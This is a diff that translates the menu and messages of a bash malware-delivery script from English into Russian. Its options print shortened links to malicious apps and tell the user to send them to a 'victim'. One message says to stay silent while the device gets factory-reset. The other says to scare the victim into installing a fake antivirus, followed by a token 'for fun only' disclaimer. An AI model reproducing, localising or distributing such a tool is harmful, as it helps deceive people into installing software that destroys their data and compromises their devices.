@@ -76,20 +76,20 @@ echo " "
 echo " "
 }
 menu(){
-echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [ОПЦИИ]$grn ＜<<<＜＜＜＜$rset"
 echo " "
 echo " "
-echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
-echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
-echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
-echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
-echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
-echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Зарозить сейчас"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Сохранить сейчас"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] О нас"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Сценарий обновлений "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Подписаться"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Подробнее"
 echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
 echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
 echo " "
 echo " "
-echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo -e "$grn               >＞＞＞＞＞$ylo [ВЫБРАТЬ]$grn ＜＜＜＜＜<$rset"
 echo " "
 echo -ne "\e[92m#SELECT OPTION\e[92m: "
 read optnz
@@ -138,17 +138,17 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m 😈  Copy below link and send it your victim and 
-say nothing to him. when he install it in his 
-device it will be factory reset and lot more happens.
+echo -e "\e[91m 😈 Скопируйте ссылку ниже и отправьте ее своей жертве и
+ничего ему не говори. Когда он установит его себе
+устройство будет сброшено к заводским настройкам и произойдет еще многое другое.
                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
 
                                  👆👆👆
-Use only for fun purpose not for harming someone 😇✌️.
-And our channel is not responsible for any kind of loss 
-you do to other's by this script."
+Используйте только для развлечения, а не для того, чтобы кому-то навредить 😇✌️.
+И наш канал не несет отвецтвенности за любые убытки. 
+Этим скриптом ты делишся с другими "
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -171,17 +171,17 @@ echo -e '\e[92m
                    (_)\_)(_____) (__) (____) '
 echo " "
 echo " "
-echo -e "\e[93m  Copy below link and send it your victim and tell him
-that he should install this application or else his 
-device will not be recovered.(Antivirus)
+echo -e "\e[93m  Скопируйте ссылку ниже и отправьте ее своей жертве и сообщите ей
+что он должен установить это приложение, иначе его
+устройство не будет восстановлено. (АНТИВИРУС) 
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-Use only for fun purpose not for harming someone 😇✌️. 
-And our channel is not responsible for any kind of 
-loss you do to other's by this script."
+Используйте только для развлечения, а не для того чтобы кто-то навредить 😇✌️. 
+И наш канал не несет ответственности ни за какие 
+убытки, которые вы причиняете другим этим сценарием."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
